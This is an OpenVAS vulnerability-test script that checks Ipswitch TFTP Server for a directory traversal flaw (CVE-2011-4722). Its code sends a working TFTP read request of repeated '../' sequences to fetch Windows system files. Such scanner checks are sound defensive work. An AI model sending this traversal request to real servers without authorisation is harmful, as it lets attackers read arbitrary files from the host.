###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ipswitch_tftp_server_dir_trav_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# Ipswitch TFTP Server Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802405");
  script_version("$Revision: 7577 $");
  script_cve_id("CVE-2011-4722");
  script_bugtraq_id(50890);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2011-12-06 11:57:11 +0530 (Tue, 06 Dec 2011)");
  script_name("Ipswitch TFTP Server Directory Traversal Vulnerability");

  script_xref(name : "URL" , value : "http://secpod.org/blog/?p=424");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18189/");
  script_xref(name : "URL" , value : "http://secpod.org/advisories/SecPod_Ipswitch_TFTP_Server_Dir_Trav.txt");
  script_xref(name : "URL" , value : "http://secpod.org/exploits/SecPod_Ipswitch_TFTP_Server_Dir_Trav_POC.py");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Remote file access");
  script_dependencies("tftpd_detect.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);

  script_tag(name : "impact" , value : "Successful exploitation will allow attackers to read arbitrary
  files on the affected application.

  Impact Level: Application");
  script_tag(name : "affected" , value : "Ipswitch TFTP Server Version 1.0.0.24 and prior");
  script_tag(name : "insight" , value : "The flaw is due to an error while handling certain requests
  containing 'dot dot' sequences (..), which can be exploited to download
  arbitrary files from the host system.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name : "summary" , value : "The host is running Ipswitch TFTP Server and is prone to directory
  traversal vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("tftp.inc");
include("network_func.inc");

## Check for tftp service
port = get_kb_item("Services/udp/tftp");
if(!port){
  port = 69;
}

## Check UDP port status as get_udp_port_state() not working properly
if(!check_udp_port_status(dport:port)){
  exit(0);
}

## list the possible files
files = traversal_files("windows");

foreach file(keys(files)) {

  ## Construct the attack request
  response = tftp_get(port:port, path:crap(data:"../", length:6*9) + files[file]);

  ## Check The response and confirm the exploit
  if (egrep(pattern:file, string:response, icase:TRUE)) {
    security_message(port: port, proto: "udp");
    exit(0);
  }
}

exit(99);
